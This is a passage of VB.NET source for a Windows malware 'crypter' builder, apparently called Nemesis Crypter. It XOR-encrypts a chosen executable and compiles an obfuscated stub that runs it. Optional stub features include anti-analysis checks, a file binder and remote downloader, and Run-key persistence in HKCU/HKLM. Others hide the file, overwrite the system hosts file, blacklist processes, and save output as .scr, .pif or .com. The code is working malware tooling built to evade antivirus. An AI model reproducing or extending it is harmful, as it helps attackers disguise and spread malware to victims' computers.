        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "ProgramFiles"
        Next
    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        Process.Start("https://www.facebook.com/developers.syriaa/")
        Process.Start("https://www.facebook.com/MONSTERMCSY")
    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        Process.Start("https://www.youtube.com/channel/UCTgM5jrZ7AKcsdIsa8NSfxA")
    End Sub

    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        Process.Start("https://discord.gg/NUAs4Z7TfS")
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        Process.Start("https://t.me/MONSTERMCSY")
    End Sub

    Private Sub cb11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb11.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "Programs"
        Next
    End Sub
    Private Sub cb12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb12.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "Recent"
        Next
    End Sub
    Private Sub cb13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb13.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "Startup"
        Next
    End Sub
    Private Sub cb14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb14.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "System"
        Next
    End Sub
#End Region

    Function Format(ByVal size As Double) As String
        If size >= 2 ^ 30 Then Return FormatNumber(size / 2 ^ 30, 2) & " GB"
        If size >= 2 ^ 20 Then Return FormatNumber(size / 2 ^ 20, 2) & " MB"
        Return FormatNumber(size / 2 ^ 10, 2) & " KB"
    End Function
    Private Sub ListView2_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles ListView2.DragDrop
        On Error Resume Next
        Dim files As String() = CType(e.Data.GetData(DataFormats.FileDrop), String())
        For Each F In files
            If Not File.Exists(F) Then

            Else
                Dim N As String = F.Substring(F.LastIndexOf("\") + 1)
                Dim I As New IO.FileInfo(F)
                Dim StringArray() As String = {N, F, Format(I.Length), "HD", "Templates", "Binder"}
                Dim newLV As New ListViewItem(StringArray)
                ListView2.Items.Add(newLV)
            End If
        Next
    End Sub

    Private Sub ListView2_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles ListView2.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub RemoveSelectedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveSelectedToolStripMenuItem.Click
        For Each S As ListViewItem In ListView2.SelectedItems
            S.Remove()
        Next
    End Sub

    Private Sub TextBox1_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles txtFile.DragDrop
        Dim File As String() = CType(e.Data.GetData(DataFormats.FileDrop), String())
        Dim F As String = File(0)
        Dim fType As String = F.Substring(F.LastIndexOf(".") + 1)
        If fType.Contains("exe") Then
            txtFile.Text = F
        Else
            MessageBox.Show("The file you're trying to add must be EXE.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
    End Sub

    Private Sub TextBox1_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles txtFile.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub TextBox2_DragEnter(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles txtIcon.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If

    End Sub

    Dim _callStartup As String = String.Empty
    Function BootStartup(ByVal folder As String, ByVal fileName As String, ByVal HKCU As Boolean, ByVal HKLM As Boolean) As String
        Dim BS As New StringBuilder
        With BS
            .AppendLine("$GB")
            .AppendLine("Sub {2}()")
            .AppendLine("On Error Resume Next")
            .AppendLine("Dim {0} As String = " & [String]("\" & fileName & ".exe"))
            .AppendLine("Dim {1} As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & " & [String](folder))
            .AppendLine("If Application.ExecutablePath = {1} & {0} Then Return")
            .AppendLine("If Not Directory.Exists({1}) Then")
            .AppendLine("Directory.CreateDirectory({1})")
            .AppendLine("End If")
            .AppendLine("If Not Application.ExecutablePath = {1} & {0} Then")
            .AppendLine("File.Copy(Application.ExecutablePath, {1} & {0})")
            .AppendLine("Else")
            .AppendLine("File.Delete({1} & {0})")
            .AppendLine("File.Copy(Application.ExecutablePath, {1} & {0})")
            .AppendLine("End If")
            .AppendLine("Dim {3} = CreateObject(" & [String]("wscript.shell") & ")")
        End With

        If cbBootCU.Checked Then
            BS.AppendLine("{3}.regwrite(" & [String]("HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run") & " & {0}, {1} & {0})")
        End If
        If cbBootLM.Checked Then
            BS.AppendLine("{3}.regwrite(" & [String]("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run") & " & {0}, {1} & {0})")
        End If
        BS.AppendLine("End Sub")
        BS.AppendLine("$GB")

        For I As Integer = 0 To 3
            If I = 2 Then
                _callStartup = Randomization.RandomPassword.Generate(1, 9)
                BS.Replace("{" & I.ToString & "}", _callStartup)
            Else
                BS.Replace("{" & I.ToString & "}", Randomization.RandomPassword.Generate(1, 9))
            End If
        Next

        Return BS.ToString
    End Function

    Private Sub TextBox2_DragDrop(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles txtIcon.DragDrop
        Dim File As String() = CType(e.Data.GetData(DataFormats.FileDrop), String())
        Dim F As String = File(0)
        Dim fType As String = F.Substring(F.LastIndexOf(".") + 1)
        If RadioButton1.Checked Then
            If fType.Contains("ico") Then
                txtIcon.Text = F
                PictureBox14.Image = Drawing.Icon.ExtractAssociatedIcon(txtIcon.Text).ToBitmap
            Else
                MessageBox.Show("The file you're trying to add to the text box is not ICO.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End If
        ElseIf RadioButton2.Checked Then
            If fType.Contains("exe") Then
                txtIcon.Text = F
                PictureBox14.Image = Drawing.Icon.ExtractAssociatedIcon(txtIcon.Text).ToBitmap
            Else
                MessageBox.Show("The file you're trying to add to the text box is not EXE.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End If
        End If
    End Sub
    Private Sub RandomizeNameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RandomizeNameToolStripMenuItem.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            Dim File As String = F.SubItems(0).Text
            Dim Type As String = File.Substring(File.LastIndexOf(".") + 1)
            F.SubItems(0).Text = Randomization.RandomPassword.Generate(3, 8) & "." & Type
        Next
    End Sub

    Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
        Dim newHex As New FormHexEditor
        newHex.Show()
    End Sub

    Private Sub Button15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button15.Click
        If File.Exists(Application.StartupPath & "\required_data\Guide.rtf") Then
            Process.Start(Application.StartupPath & "\required_data\Guide.rtf")
        Else : MessageBox.Show("Error, Guide.rtf is not found.", "Unexpected Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    Function Extension() As String
        On Error Resume Next
        Select Case ComboBox6.SelectedIndex
            Case 0
                Return "Executable Files (.exe)|*.exe"
            Case 1
                Return "SCR Files (.scr)|*.scr"
            Case 2
                Return "COM Files (.com)|*.com"
            Case 3
                Return "Batch Files (.bat)|*.bat"
            Case 4
                Return "PIF Files (.pif)|*.pif"
        End Select
    End Function

    Function BuildMessageBox(ByVal Body As String, ByVal Title As String, ByVal MessageBoxButton As String, ByVal MessageBoxStyle As String)
        Dim MB As New StringBuilder
        With MB
            .AppendLine("MessageBox.Show(" & [String](Body) & ", " & [String](Title) & ", " & MessageBoxButton & ", " & MessageBoxStyle & ")")
        End With

        Return MB.ToString
    End Function

    Function _HostEditor() As String
        Dim Store As String = String.Empty
        Dim i As Integer = 0

        For Each X As ListViewItem In ListView1.Items
            Store &= [String](ListView1.Items.Item(i).SubItems(0).Text) & " & vbNewLine & "
            i += 1
        Next

        Return "File.WriteAllText(Environment.SystemDirectory & " & [String]("\drivers\etc\hosts") & ", " & Store & "String.Empty" & ")"
    End Function

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        Try
            Dim sDlg As New SaveFileDialog With {.Filter = Extension(), .ShowHelp = True}

            'Please choose an executable
            If String.IsNullOrEmpty(txtFile.Text) Then Return
            If Not File.Exists(txtFile.Text) Then Return

            sDlg.ShowDialog()

            'Please choose a destination
            If String.IsNullOrEmpty(sDlg.FileName) Then Return

            Dim EOF_Data As String = String.Empty
            If CheckBox1.Checked Then
                EOF_Data = ReadEOFData(txtFile.Text)
            End If

            Base.Generator = New Base.Engine
            Content = New StringBuilder("$PV")
            Headers = New StringBuilder
            Methods = New StringBuilder("$GB")

            RunSet = False
            APISet = False
            NumericSet = False
            GuardSet = False
            StringSet = False
            NativeSet = False
            ManagedSet = False
            DecodeSet = False
            Wow64Set = False
            Int32Set = False
            BytesSet = False
            ManagedR = String.Empty

            GenerateKey()

            Header("System", "System.IO", "System.Text", "System.Threading", "System.Reflection", "System.Runtime.InteropServices", "System.Windows.Forms", "Microsoft.VisualBasic")

            Content.AppendLine("On Error Resume Next")

            '//CHANGE 8: Removed CulterInfo from output, only used during compiling to prevent errors from commas.
            'Content.AppendLine("Application.CurrentCulture = New Globalization.CultureInfo(" & [String]("en-US") & ", False)")

            If CheckBox13.Checked Then
                Content.AppendLine(InstallFile(ComboBox3.Text, ComboBox4.Text))
            End If

            Dim InvokeAntis As String = _CollectAnti()
            If Not InvokeAntis = String.Empty Then
                Methods.AppendLine(InvokeAntis)
            End If

            If Not InvokeAntis = String.Empty Then
                Content.AppendLine("Call " & _callAntis & "()")
            End If

            Content.AppendLine(_Bind__Downloader())

            If cbBootWindows.Checked Then
                Methods.AppendLine(BootStartup(txtBootFolder.Text, txtBootName.TabIndex, cbBootCU.CheckState, cbBootLM.CheckState))
            End If

            If cbBootWindows.Checked Then
                Content.AppendLine("Call " & _callStartup & "()")
            End If

            If cbHideFiles.Checked Then
                Content.AppendLine("File.SetAttributes(Application.ExecutablePath,FileAttributes.Hidden)")
            End If

            If cbReadOnly.Checked Then
                Content.AppendLine("File.SetAttributes(Application.ExecutablePath,FileAttributes.ReadOnly)")
            End If

            If cbMessageBox.Checked Then
                If comboMsgExecution.SelectedIndex = 0 Then
                    Content.AppendLine(BuildMessageBox(txtMessageBody.Text, txtMessageTitle.Text, MessageBoxButton, MessageBoxStyle))
                End If
            End If

            If cbBlockSites.Checked Then
                Content.AppendLine(_HostEditor)
            End If

            If cbPblacklist.Checked Then
                Content.AppendLine(_ProcessBlacklist)
            End If

            If CheckBox4.Checked Then
                Content.AppendLine(String.Format("Thread.Sleep({0})", Base.Engine.Random(500, 3500)))
            End If

            Dim Assembly As String = String.Empty
            If CheckBox15.Checked Then
                Assembly = AssemblyEditor() & vbNewLine
            End If

            If cbVisitUrl.Checked Then
                Content.AppendLine(String.Format("System.Diagnostics.Process.Start({0})", [String](txtVisitUrl.Text)))
            End If

            Dim Data As Byte() = Base.[XOR](File.ReadAllBytes(txtFile.Text))

            '//CHANGE 4: Used random name instead of form name 'Nemesis Crypter'
            Dim Name As String = Path.GetFileNameWithoutExtension(FilePath("none"))

            Select Case ComboBox1.SelectedIndex
                Case 0 'Native Resource
                    Content.AppendLine(Run(Native(Name)))
                Case 1 'Managed Resource
                    ManagedR = FilePath("resources")
                    Content.AppendLine(Run(Managed(Name)))
                Case 2 'String Variable
                    Dim T As Base.Storage = Base.StoreCString(Data)
                    Content.AppendLine(T.Declaration)
                    Content.AppendLine(Run(Decode(T.Instance)))
                Case 3 'Numeric Variable
                    Dim T As Base.Storage = Base.StoreNumeric(Data)
                    Content.AppendLine(T.Declaration)
                    Content.AppendLine(Run(Numeric(T.Instance)))
            End Select

            '//CHANGE 5: Last known good configuration
            Dim CE As New Base.CodeEngine(Base.Generator)
            CE.GlobalNoise = 300
            CE.PrivateNoise = 120
            CE.InstanceLimit = 10

            Dim _MessageBox As String = String.Empty
            If cbMessageBox.Checked Then
                If comboMsgExecution.SelectedIndex = 1 Then
                    _MessageBox = BuildMessageBox(txtMessageBody.Text, txtMessageTitle.Text, MessageBoxButton, MessageBoxStyle)
                End If
            End If

            With Headers
                .Replace("!", String.Empty)
                .AppendLine(Assembly)
                .AppendLine(GenerateGUID)
                .AppendLine("Module " & Base.Generator.Name)
                .AppendLine(Methods.ToString)
                .AppendLine("Sub Main()")
                .AppendLine(Content.ToString)
                .AppendLine(_MessageBox)
                .AppendLine("$PV")
                .AppendLine("End Sub")
                .AppendLine("$GB")
                .AppendLine("End Module")
            End With

            Dim Code As String = Base.Generator.Randomize(CE.Generate(Headers.ToString))

            System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\dd.txt", Code.ToString)

            If ComboBox1.SelectedIndex = 1 Then
                Base.CreateResource(ManagedR, New Base.Resource(Name, Data))
            End If

            Dim O As String = FilePath("exe")
            Dim pdb As String = O.Replace("exe", "pdb")
            '//CHANGE 1: Used CodeDOM icon embedding
            If Base.Compile(Code, O, txtIcon.Text, ManagedR) Then

                If ComboBox1.SelectedIndex = 0 Then
                    If Not Base.Write(O, Data, Name) Then Return
                    File.WriteAllBytes(O, Base.ClearPadding(File.ReadAllBytes(O)))
                End If

                File.Delete(sDlg.FileName)
                File.Delete(pdb)

                '//CHANGE 2: Removed UpdateIcon method

                'If File.Exists(txtIcon.Text) Then
                '    Dim iLoc As String = Randomization.RandomPassword.Generate(5, 15)
                '    File.Copy(txtIcon.Text, iLoc)
                '    IconInjector.InjectIcon(O, iLoc)
                '    File.Delete(iLoc)
                'End If

                File.Move(O, sDlg.FileName)

                If CheckBox1.Checked Then
                    WriteEOFData(sDlg.FileName, EOF_Data)
                End If

                MessageBox.Show("The file has been successfully crypted." & vbNewLine & vbNewLine & "File Location:" & vbNewLine & sDlg.FileName, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If

        Catch ex As Exception
            MessageBox.Show(ex.Message, "Unexpected Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

    End Sub

    Function GenerateGUID()
        Return "<Assembly: Guid(" & """" & System.Guid.NewGuid.ToString() & """" & ")>"
    End Function

    Private Sub cbPblacklist_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbPblacklist.CheckedChanged
        If cbPblacklist.Checked Then
            lbProcessBlacklist.Enabled = True
            txtProcess.Enabled = True
            Button5.Enabled = True
            Button6.Enabled = True
            Button7.Enabled = True
        Else
            lbProcessBlacklist.Enabled = False
            txtProcess.Enabled = False
            Button5.Enabled = False
            Button6.Enabled = False
            Button7.Enabled = False
        End If
    End Sub

    Private Sub Button14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button14.Click
        FormScript.Show()
    End Sub

    Function _Bind__Downloader() As String
        Dim BuildSource As String = String.Empty
        Dim BinderArray As String = String.Empty
        Dim c As Integer = 0

        For Each i As ListViewItem In ListView2.Items
            Dim FileName As String = i.SubItems(0).Text
            Dim PathUrl As String = i.SubItems(1).Text
            Dim Action As String = i.SubItems(3).Text
            Dim Folder As String = i.SubItems(4).Text

            If i.SubItems(5).Text = "Downloader" Then
                BuildSource &= _BuildDownloader(FileName, PathUrl, Action, Folder)
            ElseIf i.SubItems(5).Text = "Binder" Then
                BinderArray &= Encoding.Default.GetString(File.ReadAllBytes(PathUrl)) & ":"
                BuildSource &= _BuildBinder(FileName, Action, Folder, c)
                c += 1
            End If
        Next

        Return BuildSource.ToString
        _BD = Nothing
        WClient = False
    End Function

    Private Sub Button16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button16.Click
        For Each I In ComboBox7.Items
            ListView1.Items.Add(I.ToString)
        Next
    End Sub

    Private Sub PictureBox12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox12.Click

    End Sub
End Class